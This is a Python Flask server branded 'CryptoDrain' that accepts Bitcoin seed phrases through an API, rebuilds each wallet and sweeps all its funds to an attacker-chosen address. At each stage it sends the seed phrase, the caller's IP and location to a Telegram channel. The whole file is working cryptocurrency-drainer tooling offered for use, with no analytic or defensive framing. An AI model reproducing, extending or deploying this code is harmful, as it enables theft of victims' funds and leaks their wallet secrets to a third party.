# import libraries
import logging
from logging.handlers import RotatingFileHandler
from flask import Flask, request, redirect, jsonify
from bitcoinlib.wallets import *
import random
import requests
import json
import os
import pyfiglet
import time
from gevent.pywsgi import WSGIServer
import re

# create the app
app = Flask(__name__)

# configure logging
log_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
log_handler = RotatingFileHandler('logfile.txt', maxBytes=5*1024*1024, backupCount=2)
log_handler.setFormatter(log_formatter)
log_handler.setLevel(logging.INFO)

app.logger.addHandler(log_handler)
app.logger.setLevel(logging.INFO)

# boot screen + version
def boot_screen():
    # clear the screen
    print('\33c')
    app.logger.info('Terminal cleared to start the boot screen')
    # print the boot screen
    # print in #F7931A
    # print in orange
    ascii_banner = pyfiglet.figlet_format('CryptoDrain')
    print('\33[33m' + ascii_banner)
    print('\33[33m' + '--------------------- Version 1.2.0 ---------------------')
    print('----------------------- @fled-dev -----------------------' + '\33[0m')
    app.logger.info('Boot screen printed successfully')
    print()
    print()
    time.sleep(1)


# log function
def log(message):
    app.logger.info(message)


# read the config.json file
def get_config():
    # if log file exists, delete it
    try:
        os.remove('logfile.txt')
        log('Log file from previous session was found and erased')
    except:
        log('Log file was created successfully')

    # open and read the config.json file
    log('Reading config.json ...')
    with open('api/config.json', 'r') as config_file:
        config = json.load(config_file)
    log('Config.json read successfully')
    # define global variables for the config values
    log('Assigning config values to global variables ...')
    global FLASK_API_KEYS
    global TG_API_KEY
    global TG_CHANNEL_ID
    global TG_NOTIFICATIONS
    # assign the config values to the global variables
    log('Config values assigned to global variables')
    FLASK_API_KEYS = config['FLASK_API_KEYS']
    TG_API_KEY = config['TG_API_KEY']
    TG_CHANNEL_ID = config['TG_CHANNEL_ID']
    TG_NOTIFICATIONS = config['TG_NOTIFICATIONS']


# telegram notification function
def tg_notify(message):
    # check if telegram notifications are enabled
    if TG_NOTIFICATIONS is False:
        log('Telegram notification was called but is disabled')
        return
    if TG_API_KEY == '':
        log('Telegram Configuration Error : No API key found')
        return 'Telegram Configuration Error : No API key found.'
    if TG_CHANNEL_ID == '':
        log('Telegram Configuration Error : No channel ID found')
        return 'Telegram Configuration Error : No channel ID found.'

    try:
        api_url = f'https://api.telegram.org/bot{str(TG_API_KEY)}/sendMessage'
        response = requests.post(api_url, json={'chat_id': TG_CHANNEL_ID, 'parse_mode': 'Markdown', 'text': message})
        log('Telegram notification sent to the API')
        # print success message in the telegram blue
    except Exception as e:
        log('Telegram notification failed : ' + str(e))
        return 'Telegram Notification Error : ' + str(e)


def ip_location(ip):
    try:
        response = requests.get(f'https://ipapi.co/{ip}/json/').json()
        log('The server sent a request to an external API to get the IP location')
        location_data = {
            "city": response.get("city"),
            "country": response.get("country_name")
        }
        location = location_data['city'] + ' / ' + location_data['country']
        log('The external API returned the IP location successfully')
    except:
        location = 'N/A'
        log('The external API was not able to determine the IP location')
    return location


def current_ip():
    try:
        ip = request.environ['REMOTE_ADDR']
        log('Successfully fetched the environ IP')
    except:
        ip = 'N/A'
        log('Environ IP could not be fetched')
    return ip

# Strict input validation function
def validate_input(api_key, seedphrase, receiver, balance):
    # Validate API key: must match UUID format.
    if not re.fullmatch(r'[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12}', api_key):
        return False, "Invalid API key format."

    # Validate seed phrase: must be a series of words (usually 12-24) separated by spaces.
    if seedphrase and not re.fullmatch(r'(\w+\s){11,23}\w+', seedphrase):
        return False, "Invalid seed phrase format."

    # Validate receiver address: it must match the format of a Bitcoin address (including bc1 addresses).
    if receiver and not re.fullmatch(r'(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}', receiver):
        return False, "Invalid receiver address format."

    # Validate balance: must be a number and should be a positive float or integer.
    if balance and not re.fullmatch(r'\d+(\.\d{1,8})?', balance):
        return False, "Invalid balance format."

    return True, "Valid input."

# create the index page
@app.route('/api')
def api():
    try:
        # read api key
        log('The server received a request to the API and is now checking if the request was authorized')
        api_key = request.args.get('api-key')
        seedphrase = request.args.get('seedphrase')
        receiver = request.args.get('receiver')
        balance = request.args.get('balance')

        # Validate inputs
        is_valid, validation_message = validate_input(api_key, seedphrase, receiver, balance)
        if not is_valid:
            log(f'Input validation failed: {validation_message}')
            return jsonify({'error': validation_message}), 400

        # check if API key is valid
        if api_key not in FLASK_API_KEYS:
            notification = f'*Error - Connection Refused (1/3)*\n\nSomeone tried to connect to the API without a valid API key.\n\nIP: {str(current_ip())}\nLocation: {str(ip_location(current_ip()))}\nAPI Key: {str(api_key)}'
            log('Someone tried to connect to the API without a valid API key')
            tg_notify(str(notification))
            return jsonify({'error': 'Invalid API key'}), 403

        log('Someone connected to the API with a valid API key')
        notification = f'*Success - Connection Established (1/3)*\n\nSomeone connected to the API with a valid API key.\n\nIP: {str(current_ip())}\nLocation: {str(ip_location(current_ip()))}'
        tg_notify(str(notification))

        # run the sweep function
        log('Trying to sweep the wallet ...')
        return sweep(seedphrase, receiver, balance)

    except Exception as e:
        log('An error occurred in the api() function: ' + str(e))
        # send notification
        fatal_error = '*Fatal Error - Function: api()*\n\nA critical error occurred in the api() function and immediate assistance is required.\n\nUnfortunately, the Telegram API is not able to parse entities. The error cannot be displayed here. Find more info in the *logfile.txt*.'
        tg_notify(str(fatal_error))
        print(f'Fatal Error: {str(e)}')
        return jsonify({'error': 'A server error occurred. Please try again later.'}), 500

# sanitize and sweep the wallet
def sweep(seedphrase, receiver, balance):
    # Input sanitization to avoid XSS
    seedphrase = sanitize_input(seedphrase)
    receiver = sanitize_input(receiver)
    balance = sanitize_input(balance)

    print('---')
    print('---')
    print(f'Seed Phrase: {str(seedphrase)}')
    print(f'Receiver: {str(receiver)}')
    print('---')
    print('Scanning Wallet ...')

    # Generate random wallet name (12 random characters)
    log('Generating random wallet name to avoid conflicts ...')
    random_wallet_name = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(12))

    # Validate the seed phrase
    log('Validating the seed phrase ...')
    if wallet_delete_if_exists(str(random_wallet_name), force=True):
        pass

    # Try to create the wallet
    try:
        log('Trying to create the wallet ...')
        w = Wallet.create(str(random_wallet_name), keys=str(seedphrase), network='bitcoin', witness_type='segwit')
        w.scan()
        w.info()
        log('Wallet created successfully')
        # Send notification -> wallet created
        notification = f'*Success - Wallet Created (2/3)*\n\nThe wallet was created successfully. Find more information below.\n\nSeed: {str(seedphrase)}\nBalance (not verified): {str(balance)} BTC'
        tg_notify(str(notification))
        print('Success: Wallet Created')   
    except Exception as e:
        # Send notification -> wallet creation failed
        log('Wallet creation failed: ' + str(e))
        notification = f'*Error - Wallet Creation Failed (2/3)*\n\n{str(e)}\n\nIP: {current_ip()}\nLocation: {ip_location(current_ip())}\nSeed: {str(seedphrase)}\nBalance (not verified): {str(balance)} BTC'
        tg_notify(str(notification))
        print(f'Error: {str(e)}')
        return jsonify({'error': 'Wallet creation failed.'}), 500

    # Try to sweep the wallet
    try:
        t = w.sweep(str(receiver), offline=False)
        log('Wallet swept successfully')
        # Send notification -> wallet swept
        notification = f'*Success - Wallet Swept (3/3)*\n\nThe wallet was swept successfully. Find more information below.\n\nReceiver: {receiver}\nBalance (not verified): {str(balance)} BTC'
        tg_notify(str(notification))
        print('Success: Wallet Swept (3/3)')
        return jsonify({'message': 'Wallet swept successfully.'}), 200
    except Exception as e:
        log('Wallet sweep failed: ' + str(e))
        notification = f'*Error - Wallet Not Swept (3/3)*\n\n{str(e)}\n\nIP: {current_ip()}\nLocation: {ip_location(current_ip())}\nSeed: {str(seedphrase)}\nBalance (not verified): {str(balance)} BTC'
        tg_notify(str(notification))
        print(f'Error: {str(e)}')
        return jsonify({'error': 'Wallet sweep failed.'}), 500

# Sanitize input to prevent XSS attacks
def sanitize_input(value):
    if value:
        # Replace characters like '<', '>', and '&' with safe equivalents.
        sanitized_value = value.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
        return sanitized_value
    return value

# Run the app
if __name__ == '__main__':
    # read the config.json file
    boot_screen()
    get_config()
    print()
    # define the host and ip
    # host_ip = urllib.request.urlopen('https://v4.ident.me').read().decode('utf8')
    host_ip = '127.0.0.1'
    host_port = 8080
    time.sleep(0.5)
    print(f'\033[1mHost IP : {host_ip}')
    print(f'Host Port : {host_port}\033[0m')
    print()

    try:
        # run the app
        print('Server is waiting for incoming requests ...')
        http_server = WSGIServer((host_ip, host_port), app)
        http_server.serve_forever()
        # notification is not possible because the server started already
    except Exception as e:
        log('An error occured in the main function : ' + str(e))
        # send notification -> fatal error
        notification = f"*Fatal Server Error - Flask Server Couldn't Start*\n\n{str(e)}"
        tg_notify(notification)
        print(f'Fatal Error : {str(e)}')
